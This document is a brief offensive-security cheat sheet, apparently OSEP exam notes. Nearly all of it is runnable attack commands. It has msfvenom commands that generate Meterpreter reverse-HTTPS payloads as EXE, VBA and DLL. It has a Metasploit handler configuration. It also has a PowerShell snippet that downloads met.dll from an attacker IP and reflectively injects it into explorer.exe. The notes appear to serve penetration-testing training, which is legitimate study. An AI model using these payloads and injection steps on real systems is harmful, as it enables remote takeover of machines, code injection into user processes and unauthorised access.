# OSEP-Survival Joruney: Complete Guide

## Reverse Shell Handler 

### Metasploit Payload Generation
```
#Staged
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.221 LPORT=443 -f exe -o ./msfstaged.exe

#NonStaged
sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.221 LPORT=443 -f exe -o ./msfnonstaged.exe

##VBA Staged
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication

##DLL Staged
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
```

### Metasploit Basic handler
```
sudo msfconsole -q
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.45.221
```

### DLL Injection
```
#Load DLL into bytes
$filePath = "C:\Path\To\YourFile.dll"
$bytes = Get-Content -Path $filePath -Encoding Byte -ReadCount 0

#Reflective DLL Injection
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```